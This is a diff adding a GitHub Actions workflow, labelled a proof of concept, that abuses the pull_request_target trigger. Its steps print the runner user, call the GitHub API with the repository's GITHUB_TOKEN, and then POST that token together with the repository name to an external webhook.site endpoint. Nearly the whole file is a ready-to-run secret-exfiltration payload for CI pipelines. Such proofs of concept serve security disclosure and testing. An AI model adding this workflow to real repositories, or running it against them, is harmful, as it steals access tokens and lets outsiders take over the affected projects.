@@ -1,0 +1,35 @@
+name: pull_request_target-token-poc
+
+on:
+  pull_request_target:
+    branches: [ main ]
+
+jobs:
+  poc:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Show execution context
+        run: |
+          echo "Triggered by: pull_request_target"
+          echo "Running as user:"
+          whoami
+
+      - name: Prove GitHub token access
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          echo "Token length: ${#GITHUB_TOKEN}"
+
+          echo "Testing GitHub API access..."
+          curl -s -H "Authorization: Bearer $GITHUB_TOKEN" \
+               -H "Accept: application/vnd.github+json" \
+               https://api.github.com/repos/${{ github.repository }} \
+               | head -n 20
+
+      - name: Exfiltrate token to external endpoint (PoC)
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          curl -X POST https://webhook.site/REPLACE-WITH-YOUR-ID \
+            -H "Content-Type: application/json" \
+            -d "{\"repo\":\"${{ github.repository }}\",\"token\":\"$GITHUB_TOKEN\",\"event\":\"pull_request_target\"}"
